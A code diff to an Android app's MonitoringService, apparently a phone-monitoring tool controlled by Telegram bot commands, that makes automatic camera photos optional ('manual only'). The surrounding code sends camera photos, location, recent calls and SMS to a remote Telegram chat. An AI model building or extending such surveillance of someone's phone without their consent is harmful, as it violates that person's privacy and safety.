@@ -140,7 +140,7 @@ class MonitoringService : Service() {
         cameraJob = serviceScope.launch {
             while (isActive) {
                 try {
-                    if (!preferencesManager.monitoringPaused && !isPhotoPaused()) {
+                    if (!preferencesManager.monitoringPaused && !isPhotoPaused() && preferencesManager.cameraInterval > 0) {
                         captureAndSendPhoto()
                     }
                     delay(cameraIntervalMillis())
@@ -155,7 +155,8 @@ class MonitoringService : Service() {
     }
 
     private fun cameraIntervalMillis(): Long {
-        return preferencesManager.cameraInterval.coerceIn(1, 60) * 60_000L
+        val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
+        return if (minutes <= 0) 60_000L else minutes * 60_000L
     }
 
     // ═══════════════════════════════════════════════════════════
@@ -221,6 +222,8 @@ class MonitoringService : Service() {
                 val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                 val photoState = if (isPhotoPaused()) {
                     "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
+                } else if (preferencesManager.cameraInterval <= 0) {
+                    "manual only (/photo)"
                 } else {
                     "every ${preferencesManager.cameraInterval} min"
                 }
@@ -256,9 +259,12 @@ class MonitoringService : Service() {
                 }
             }
             "/photointerval" -> {
-                val minutes = arg.toIntOrNull()?.coerceIn(1, 60)
+                val minutes = arg.toIntOrNull()?.coerceIn(0, 60)
                 if (minutes == null) {
-                    sendToTelegram("Usage: /photointerval \u003c1-60\u003e (minutes)")
+                    sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
+                } else if (minutes == 0) {
+                    preferencesManager.cameraInterval = 0
+                    sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                 } else {
                     preferencesManager.cameraInterval = minutes
                     sendToTelegram("📸 Photo interval set to $minutes min.")
@@ -324,7 +330,7 @@ class MonitoringService : Service() {
                         appendLine("/location - send current location")
                         appendLine("/lastcalls - show last 5 calls")
                         appendLine("/lastsms - show last 5 SMS")
-                        appendLine("/photointerval \u003c1-60\u003e - set photo interval")
+                        appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                         appendLine("/pause \u003cminutes\u003e - pause photos")
                         appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
